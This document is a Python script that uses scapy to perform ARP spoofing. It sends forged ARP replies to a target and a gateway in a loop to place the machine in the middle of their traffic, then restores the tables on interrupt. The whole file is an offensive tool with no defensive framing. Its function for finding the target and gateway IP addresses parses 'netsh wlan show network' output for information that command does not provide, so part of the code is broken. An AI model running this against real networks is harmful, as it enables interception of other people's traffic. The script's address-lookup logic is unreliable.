import scapy.all as scapy
import time
import subprocess

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    return answered_list[0][1].hwsrc

def get_target_and_gateway_ip(ssid):
    try:
        result = subprocess.check_output(["netsh", "wlan", "show", "network"]).decode("ISO-8859-1")
        networks = result.split("SSID")
        for network in networks:
            if ssid in network:
                lines = network.split('\n')
                target_ip = lines[4].split(":")[1].strip()
                gateway_ip = lines[5].split(":")[1].strip()
                return target_ip, gateway_ip
    except Exception as e:
        print(f"Error: {e}")
        return None

def spoof(target_ip, gateway_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)
    scapy.send(packet, verbose=False)

def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)

# Windows doesn't have a /proc/sys/net/ipv4 directory
# Just skip the IP forwarding part on Windows
# subprocess.call(["echo", "1", ">", "/proc/sys/net/ipv4/ip_forward"])

ssid = input("Enter the SSID of the Wi-Fi hotspot: ")
ip_info = get_target_and_gateway_ip(ssid)
if ip_info is not None and len(ip_info) == 2:
    target_ip, gateway_ip = ip_info
    try:
        sent_packets_count = 0
        while True:
            spoof(target_ip, gateway_ip)
            spoof(gateway_ip, target_ip)
            sent_packets_count += 2
            print("\r[+] Packets Sent: " + str(sent_packets_count), end="")
            time.sleep(2)
    except KeyboardInterrupt:
        print("\n[-] Detected CTRL + C ... Resetting ARP tables ... Please wait.")
        restore(target_ip, gateway_ip)
        restore(gateway_ip, target_ip)
        print("[+] ARP tables restored.")
else:
    print("Error: Unable to retrieve target and gateway IP addresses for the specified SSID.")
